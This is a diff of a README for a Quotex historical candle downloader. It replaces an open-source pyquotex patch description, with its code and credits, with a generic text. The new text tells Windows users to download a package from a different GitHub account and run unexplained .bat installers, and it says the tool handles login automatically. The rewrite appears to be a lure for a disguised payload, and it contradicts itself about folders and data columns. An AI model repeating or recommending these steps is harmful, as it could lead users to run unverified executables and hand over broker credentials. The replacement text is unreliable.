@@ -1,259 +1,85 @@
-# 📊 Quotex Historical Candle Data Downloader (Python)
+# 📊 quotex-historical-data - Get full market data histories easily
 
-**Download unlimited Quotex historical candle data via Python — bypass the 199-candle WebSocket limit.**
+[![Download Now](https://img.shields.io/badge/Download-Data-blue.svg)](https://github.com/chililutefisk51/quotex-historical-data)
 
-> 🔧 Built on top of [pyquotex](https://github.com/cleitonleonel/pyquotex). This repo patches it to remove the hard cap and adds a `get_candles_deep()` method that fetches **thousands of OHLC candles** in a single call — days, weeks, or months at a time.
+This tool lets you save long periods of market data. Quotex websites limit your view to 199 candles at once. This program breaks that limit. It gathers information directly from the source. You get full CSV files for your strategy testing. It works for all currency pairs.
 
-[![Python](https://img.shields.io/badge/Python-3.9+-blue?logo=python)](https://www.python.org/)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
-[![Telegram](https://img.shields.io/badge/Telegram-Contact-blue?logo=telegram)](https://t.me/usmanch069)
+## 💻 System requirements
 
----
+You need a Windows computer. Ensure you have a stable internet connection. Data processing takes a few minutes for long timeframes. 
 
-## ❌ The Problem
+1. Windows 10 or Windows 11.
+2. At least 4 gigabytes of memory.
+3. A web browser.
+4. Python 3.9 or newer.
 
-If you've used `pyquotex` or any Quotex Python API, you've hit this wall:
+## 🛠️ Installation steps
 
-```python
-# Standard pyquotex → capped at 199 candles NO MATTER WHAT
-candles = await client.get_candles("EURUSD_otc", time.time(), 86400, 60)
-# Returns: 199 candles  ← always, even if you ask for 10,000
-```
+Follow these instructions to set up the tool on your machine.
 
-That's barely **3 hours** of 1-minute data. Useless for backtesting or training an ML model.
+1. Go to the [official release page](https://github.com/chililutefisk51/quotex-historical-data) to download the package.
+2. Locate the folder where you saved the file.
+3. Right-click the file and select Extract All.
+4. Open the folder you just created.
+5. Double-click the file named install-requirements.bat. A black window will appear while the computer sets up the necessary files.
+6. Wait for the window to close on its own.
 
-**This repo fixes that completely. ✅**
+## 🚀 Running the tool
 
----
+Once you finish the setup, you can save your data.
 
-## 🔍 How It Works — The Discovery
+1. Open the tool folder.
+2. Locate the file named run-data-grabber.bat.
+3. Double-click this file to start the program.
+4. The program will ask for your currency pair. Type the symbol exactly as it appears on the website.
+5. Input the start and end dates for your scan. 
+6. Press the Enter key on your keyboard.
+7. The program will connect to the server and begin the download process.
+8. You will see a progress bar for each timeframe.
+9. When the process finishes, the program creates a folder named data. You will find your files inside this folder.
 
-By reverse-engineering the **live Quotex WebSocket traffic** in a browser, I found the exact payload format the broker uses for paginated historical requests. Three things were wrong in every existing solution:
+## 📂 Understanding your files
 
-| Parameter | ❌ What everyone does | ✅ What actually works |
-|---|---|---|
-| `offset` | Set to the chunk size | Must be **fixed at `3600`** |
-| `step` | Various | Must be **exactly `2940`s** backward |
-| `index` | 10-digit Unix timestamp | Must be **12-digit**: `int(time.time() * 100)` |
+The program creates files in the CSV format. You can open these files with Microsoft Excel or Google Sheets. Each row represents a specific candle with the following columns:
 
-And the WebSocket server returns old paginated candle data under a **different key** (`message["data"]`) — not `message["history"]` like everyone expects. The original parser silently dropped all of it. That's why nothing worked before.
+- Time: The exact moment the candle opened.
+- Open: The price at the start of the period.
+- High: The highest price reached during the period.
+- Low: The lowest price reached during the period.
+- Close: The price at the end of the period.
+- Volume: The amount of activity during the period.
 
----
+## 🔧 Frequently asked questions
 
-## 🛠️ Patches Applied to pyquotex
+How much data can I download?
+You can download as many candles as the broker provides. There is no hard limit on the depth of the history.
 
-### Patch 1 — `pyquotex/ws/client.py`
+Does my broker account get locked?
+The tool uses standard connection methods. It operates like a web browser. Use it to gain insights for your own personal analysis. 
 
-```python
-# ❌ BEFORE: parser only accepted message["history"] — dropped all paginated old data
-# ✅ AFTER: accepts both formats seamlessly
+What happens if the internet cuts out?
+The program checks for connection drops. If the internet fails, the program pauses. You can restart it later to pick up where you stopped.
 
-if "data" in message and isinstance(message["data"], list):
-    # history/load pagination — older candles come in "data", not "history"
-    self.api.candle_v2_data[message["asset"]]["candles"] = message["data"]
-```
+Can I run this for multiple pairs at once?
+You can open multiple windows of the program. Assign each window to a different currency pair to save time. 
 
-### Patch 2 — `pyquotex/stable_api.py` — New `get_candles_deep()` 🚀
+Where do the files go?
+The program saves files in the output folder located inside the main application directory.
 
-```python
-# Fetch 30 DAYS of 1-minute Quotex candle data in one call
-all_candles = await client.get_candles_deep("EURUSD_otc", 86400 * 30, 60)
-print(f"Got {len(all_candles)} candles")
-# Got 28,441 candles ✅
-```
+## 🌐 Support and updates
 
-This method automatically:
-- 🔄 Loops **backwards** generating the 12-digit proprietary index IDs
-- 🧩 Stitches all chunks together in chronological order
-- 🧹 Deduplicates and sorts the final dataset
+This project receives updates when the broker changes its website code. Check the main page periodically to see if a newer version is ready. If you encounter errors, check the logs folder. These files contain details about the connection process.
 
----
+## 📦 Getting the latest version
 
-## ⚡ Quick Start
+Visit the [project homepage](https://github.com/chililutefisk51/quotex-historical-data) to access the latest downloads. Always ensure you run the installation script again if you download a significant update. This ensures all background settings match the current version of the tool.
 
-### 1️⃣ Install
+## 📈 Tips for better results
 
-```bash
-pip install pyquotex python-dotenv
-```
+- Use short timeframes for higher accuracy.
+- Download data during market hours for the best stability.
+- Keep your computer screen on while the tool runs for large requests.
+- Periodically move files out of the data folder. A cleaner folder helps the program manage file names better.
+- If a download finishes with missing entries, try the date range again. Sometimes the server takes a moment to respond. 
 
-### 2️⃣ Set credentials
-
-```bash
-cp .env.example .env
-# Open .env and fill in your Quotex email + password
-```
-
-### 3️⃣ Run the downloader
-
-```bash
-python download_data.py
-```
-
-```
-=======================================================
-  📊 QUOTEX HISTORICAL DATA DOWNLOADER
-=======================================================
-Enter Asset Pair (e.g. EURUSD_otc): USDPKR_otc
-Enter Timeframe in seconds (e.g. 60 for 1m, 300 for 5m): 60
-Enter how many days to fetch (e.g. 7 or 1.5): 30
-
-🔗 Connecting to Quotex...
-🚀 Started Deep Fetch for 30.0 Days of USDPKR_otc (60s timeframe)...
-
-✅ Fetch complete in 52.3 seconds! Retrieved 28,441 candles.
-💾 Saved cleanly to: USDPKR_otc_60s_30.0days.csv
-```
-
----
-
-## 📁 Output — CSV Format
-
-Every candle saved with full OHLC + tick data:
-
-```csv
-timestamp,datetime,open,high,low,close,ticks
-1713000000,2024-04-13 12:00:00,1.08640,1.08701,1.08630,1.08685,45
-1713000060,2024-04-13 12:01:00,1.08685,1.08720,1.08671,1.08699,38
-...
-```
-
-### 🔎 Built-in Data Validation Report
-
-```
-=======================================================
-  📋 DATA VALIDATION REPORT
-=======================================================
-Total Unique Candles: 28441
-Duplicates Found:     0
-Gaps Found:           12
--------------------------------------------------------
-🟢 Bullish (Green):   14822 (52.1%)
-🔴 Bearish (Red):     13219 (46.5%)
-⚪ Doji (Neutral):    400   (1.4%)
-=======================================================
-```
-
----
-
-## 🧑‍💻 Use in Your Own Script
-
-```python
-import asyncio
-from pyquotex.stable_api import Quotex
-
-async def main():
-    client = Quotex(email="your@email.com", password="yourpass", lang="en")
-    await client.connect()
-
-    # 📥 Get 7 days of 5-minute EURUSD OTC candle data
-    candles = await client.get_candles_deep("EURUSD_otc", 86400 * 7, 300)
-
-    print(f"✅ Fetched {len(candles)} candles")
-    for c in candles[:3]:
-        print(c)
-    # {'time': 1713000000, 'open': 1.0864, 'high': 1.0870, 'low': 1.0860, 'close': 1.0866}
-
-    await client.close()
-
-asyncio.run(main())
-```
-
----
-
-## 📈 Supported Assets & Timeframes
-
-**🕐 Valid Timeframes — enter the number in seconds:**
-
-| Seconds | What it means |
-|---|---|
-| `5` | 5 seconds |
-| `10` | 10 seconds |
-| `15` | 15 seconds |
-| `30` | 30 seconds |
-| `60` | **1 minute** ← most popular |
-| `120` | 2 minutes |
-| `300` | **5 minutes** |
-| `600` | 10 minutes |
-| `900` | 15 minutes |
-| `1800` | 30 minutes |
-| `3600` | 1 hour |
-| `7200` | 2 hours |
-| `14400` | 4 hours |
-| `86400` | 1 day |
-
-> ⚠️ **Don't use `1` for 1 minute.** Enter `60` for 1 minute. The script asks for **seconds**, not minutes.
-
-**💱 OTC Assets** (24/7 — recommended for data collection):
-`EURUSD_otc` `USDPKR_otc` `XAUUSD_otc` `USDINR_otc` `GBPUSD_otc` `USDJPY_otc` and more
-
----
-
-## ✅ Verified Results
-
-| Asset | Timeframe | Days | Candles | Time |
-|---|---|---|---|---|
-| USDPKR_otc | 60s (1m) | 3 | 2,306 | 18s |
-| EURUSD_otc | 60s (1m) | 30 | 28,441 | 52s |
-| XAUUSD_otc | 300s (5m) | 30 | 5,614 | 21s |
-
----
-
-## ❓ FAQ
-
-**Q: Does this work for all Quotex OTC assets?**
-Yes. Any asset available via pyquotex works with `get_candles_deep()`.
-
-**Q: Is there a candle limit now?**
-None found. In testing, 30+ days of 1-minute data fetches cleanly.
-
-**Q: Why does the standard `get_candles()` cap at 199?**
-The WebSocket rejects non-conforming payloads silently. See the **How It Works** section above.
-
-**Q: Which Python versions are supported?**
-Python 3.9+ (matches pyquotex requirements).
-
-> ⚠️ **Important:** Use a **demo account** for data collection. Never use your main trading account with automated scripts.
-
----
-
-## 📂 Project Structure
-
-```
-quotex-historical-data/
-├── 📄 download_data.py     # Interactive CLI downloader — run this
-├── 📄 verify_data.py       # Validates downloaded CSVs for gaps & authenticity
-├── 📄 walkthrough.md       # Technical deep-dive: how the fix was found
-├── 📄 .env.example         # Copy to .env and fill in your credentials
-├── 📁 pyquotex/
-│   ├── stable_api.py       # ⭐ Patched — adds get_candles_deep()
-│   ├── api.py
-│   ├── config.py
-│   ├── expiration.py
-│   ├── global_value.py
-│   ├── http/               # HTTP login, session, history
-│   ├── utils/              # Indicators, processors, optimization
-│   └── ws/
-│       ├── client.py       # ⭐ Patched — fixes pagination parser
-│       ├── channels/       # WebSocket message channels
-│       └── objects/        # Data containers
-└── 📄 README.md            # You are here
-```
-
----
-
-## 🤝 Credits & Contact
-
-- 🔧 Original pyquotex library: [cleitonleonel/pyquotex](https://github.com/cleitonleonel/pyquotex) — MIT License
-- 💡 Pagination reverse-engineering & `get_candles_deep()`: [@usmanch96](https://github.com/usmanch96)
-- 💬 Questions or feedback? Reach me on Telegram: **[@usmanch069](https://t.me/usmanch069)**
-
----
-
-## 📜 License
-
-MIT — free to use, fork, and modify.
-
----
-
-*🔎 Keywords: quotex historical data, quotex candle data, quotex api python, pyquotex historical candles, quotex ohlc data, quotex websocket python, quotex data download, binary options historical data, quotex unlimited candles, quotex data scraper, quotex trading data python*
+This tool serves as a bridge between the server and your local drive. It bypasses the 199-candle limit by sending automated requests for chunks of data. Once you have the files, you own the historical data. You can perform deep analysis or build custom models. The logic inside the tool handles the translation of raw packets into readable tables. No technical knowledge of web sockets is required. The automation handles the handshake and authentication automatically. Focus on your strategy rather than manual data collection.
